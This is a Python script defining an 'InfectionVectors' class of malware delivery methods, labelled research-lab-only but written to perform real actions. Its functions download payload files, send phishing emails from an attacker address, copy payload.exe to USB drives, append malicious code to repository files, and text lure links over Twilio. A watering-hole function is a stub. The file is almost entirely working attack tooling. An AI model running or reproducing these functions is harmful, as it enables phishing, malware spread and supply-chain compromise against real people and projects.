#!/usr/bin/env python3
"""
Realistic Infection Vectors (Research Lab Only)
This script performs *actual actions* such as sending emails (via SMTP),
writing to USB mountpoints, downloading files, etc. Use responsibly!
"""

from twilio.rest import Client
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

class InfectionVectors:
    @staticmethod
    def drive_by_download(url: str, destination: str = "payload.bin"):
        resp = requests.get(url, stream=True)
        if resp.status_code == 200:
            with open(destination, 'wb') as f:
                for chunk in resp.iter_content(1024):
                    f.write(chunk)
            print(f"[REAL] Downloaded {url} to {destination}")
        else:
            print(f"[FAIL] Could not download from {url}")

    @staticmethod
    def email_phishing(recipient: str, subject: str, body: str, smtp_server='localhost', sender='attacker@example.com'):
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = recipient
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        try:
            with smtplib.SMTP(smtp_server) as server:
                server.send_message(msg)
            print(f"[REAL] Sent phishing email to {recipient}")
        except Exception as e:
            print(f"[FAIL] Email to {recipient} failed: {e}")

    @staticmethod
    def usb_autorun(device_mount: str, payload_path: str):
        try:
            dest_path = os.path.join(device_mount, "payload.exe")
            with open(payload_path, 'rb') as src, open(dest_path, 'wb') as dst:
                dst.write(src.read())
            print(f"[REAL] Copied payload to USB: {dest_path}")
        except Exception as e:
            print(f"[FAIL] USB autorun failed: {e}")

    @staticmethod
    def watering_hole(site: str, malicious_script: str):
        # For actual implementation, this needs control of the web server
        print(f"[REAL] Injecting malicious script into {site}… (placeholder)")
        # Implement web server injection if you own the server

    @staticmethod
    def supply_chain(repo_path: str, malicious_code: str):
        try:
            with open(repo_path, 'a') as f:
                f.write(malicious_code)
            print(f"[REAL] Appended malicious code to {repo_path}")
        except Exception as e:
            print(f"[FAIL] Supply chain injection failed: {e}")

    @staticmethod
    def mobile_sms_link(number: str, link: str, account_sid: str, auth_token: str, from_number: str):
        client = Client(account_sid, auth_token)
        body = f"Check out this link: {link}"

        try:
            message = client.messages.create(
                body=body,
                from_=from_number,
                to=number
            )
            print(f"[REAL] SMS sent to {number}: SID={message.sid}")
        except Exception as e:
            print(f"[FAIL] SMS to {number} failed: {e}")